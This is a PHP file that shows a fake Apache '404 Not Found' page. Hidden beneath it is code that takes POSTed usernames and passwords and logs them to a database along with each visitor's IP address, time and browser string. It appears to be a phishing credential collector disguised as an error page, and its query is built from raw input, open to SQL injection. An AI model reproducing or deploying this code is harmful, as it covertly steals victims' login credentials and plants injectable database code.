<?php
http_response_code(404);
?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.51 (Win64) PHP/7.4.26 Server at <?php echo $_SERVER["HTTP_HOST"];?> Port 80</address>
</body></html>

<?php
include("db.php");

if(isset($_POST["u"])){
    $username = $_POST["u"];
    $password = $_POST["p"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $time = time();
    $ua = $_SERVER["HTTP_USER_AGENT"];
    $conn->query("insert into data(username,password,ip,time,ua) values (\"$username\",\"$password\",\"$ip\",\"$time\",\"$ua\");");
}

?>